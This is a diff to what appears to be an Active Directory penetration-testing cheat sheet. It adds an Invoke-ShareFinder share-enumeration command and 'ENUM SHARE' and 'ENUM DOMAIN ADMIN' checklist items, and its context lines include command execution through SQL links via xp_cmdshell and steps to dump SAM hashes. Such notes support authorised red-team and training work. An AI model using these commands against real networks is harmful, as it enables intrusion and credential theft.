@@ -143,6 +143,12 @@ Get-SQLServerLinkCrawl -Instance <FQDN-SQL-Server> -Verbose (Enum server sql to 
 ```
 Get-SQLServerLinkCrawl -Instance <FQDN-SQL-Server> -Query "exec master..xp_cmdshell 'whoami'"
 ```
+
+# ENUM SHARE
+```
+Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose
+```
+
 # Priv Esc
 
 PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
@@ -558,6 +564,7 @@ Skeleton Key (!!!!!!)
 CHECK LIST:
 
 GATHERING BASIC INFO:
+- ENUM DOMAIN ADMIN
 - ENUM DOMAIN
 - ENUM USER
 - ENUM GROUP
@@ -566,6 +573,7 @@ GATHERING BASIC INFO:
 - ENUM GPO & OU
 - RUN BLOODHOUND (check shortest path to domain admins)
 - ENUM TRUST
+- ENUM SHARE
 
 WHEN COMPROMISE MACHINE -> DUMP SAM BASE
 WHEN COMPROMISE USER    -> FindLocalAdminAccess
